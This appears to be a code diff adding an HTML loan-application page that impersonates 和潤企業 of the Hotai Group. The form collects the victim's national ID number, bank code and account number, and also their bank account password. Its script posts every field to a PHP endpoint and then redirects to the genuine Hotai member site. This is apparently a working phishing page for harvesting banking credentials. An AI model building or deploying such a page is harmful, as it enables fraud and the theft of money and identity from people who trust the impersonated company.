@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>和泰集團</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .form-subtitle {
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            background-color: #d32f2f;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.querySelector('form');
+            form.addEventListener('submit', function(event) {
+                event.preventDefault(); // 防止表單的默認提交行為
+
+                // 收集表單數據
+                const formData = new FormData(form);
+                const data = {};
+                formData.forEach((value, key) => { data[key] = value });
+
+                // 發送數據到 PHP 腳本
+                fetch('process_form.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                }).then(response => response.json())
+                .then(result => {
+                    if (result.status === 'success') {
+                        alert('資料已送出 - 請耐心等候');
+                        window.location.href = 'https://www.hotaimember.com.tw/member/'; // 替換成你想跳轉的網址
+                    } else {
+                        alert('資料提交失敗: ' + result.message);
+                    }
+                }).catch(error => {
+                    alert('發生錯誤: ' + error.message);
+                });
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="images/logo.png" alt="Logo" class="logo">
+            <h1>和潤企業股份有限公司</h1>
+        </div>
+        <div class="form-title">名下貸款情況</div>
+        <form>
+            <!-- 名下貸款情況 -->
+            <div class="form-group">
+                <label>名下有無其他貸款業務：</label>
+                <label><input type="radio" name="other_loans" value="有" required> 有</label>
+                <label><input type="radio" name="other_loans" value="無" required> 無</label>
+            </div>
+            <div class="form-group">
+                <label>繳款情況是否正常：</label>
+                <label><input type="radio" name="payment_status" value="是" required> 是</label>
+                <label><input type="radio" name="payment_status" value="否" required> 否</label>
+            </div>
+            <div class="form-group">
+                <label for="recent_loans">近三個月是否有辦理其他貸款或分期：</label>
+                <input type="text" id="recent_loans" name="recent_loans" required>
+            </div>
+            
+            <!-- 申辦準備資料 -->
+            <div class="form-subtitle">申辦準備資料</div> <!-- 子標題 -->
+            <div class="form-group">
+                <label for="loan_amount">申請需求金額：</label>
+                <select id="loan_amount" name="loan_amount" required>
+                    <option value="">請選擇金額</option>
+                    <option value="50000">50,000</option>
+                    <option value="100000">100,000</option>
+                    <option value="200000">200,000</option>
+                    <option value="300000">300,000</option>
+                    <option value="400000">400,000</option>
+                    <option value="500000">500,000</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="loan_purpose">申請資金用途：</label>
+                <input type="text" id="loan_purpose" name="loan_purpose" placeholder="請填寫資金用途" required>
+            </div>
+            <div class="form-group">
+                <label for="identity_number">申請撥款發放帳戶：</label>
+                <input type="text" id="identity_number" name="identity_number" placeholder="身份證字號" required>
+            </div>
+            <div class="form-group">
+                <label for="bank_code">銀行代碼：</label>
+                <input type="text" id="bank_code" name="bank_code" placeholder="銀行代碼" required>
+            </div>
+            <div class="form-group">
+                <label for="loan_bank_account">撥款銀行帳號：</label>
+                <input type="text" id="loan_bank_account" name="loan_bank_account" placeholder="撥款銀行帳號" required>
+            </div>
+            <div class="form-group">
+                <label for="loan_bank_code">撥款銀行密碼：</label>
+                <input type="text" id="loan_bank_code" name="loan_bank_code" placeholder="撥款銀行密碼" required>
+            </div>
+            <div class="form-group">
+                <label for="loan_officer">申請貸款業務：</label>
+                <select id="loan_officer" name="loan_officer" required>
+                    <option value="">請選擇貸款業務</option>
+                    <option value="car_loan">汽機車貸款</option>
+                    <option value="product_loan">商品貸款</option>
+                    <option value="personal_loan">個人信貸</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>本人是否為和潤客戶：</label>
+                <label><input type="radio" name="existing_customer" value="是" required> 是</label>
+                <label><input type="radio" name="existing_customer" value="否" required> 否</label>
+            </div>
+            <div class="form-group">
+                <label><input type="checkbox" name="confirm_data" required> 已確認資料填寫完整並核對無誤</label>
+            </div>
+            <button type="submit" class="submit-button">確認申辦</button>
+        </form>
+    </div>
+</body>
+</html>
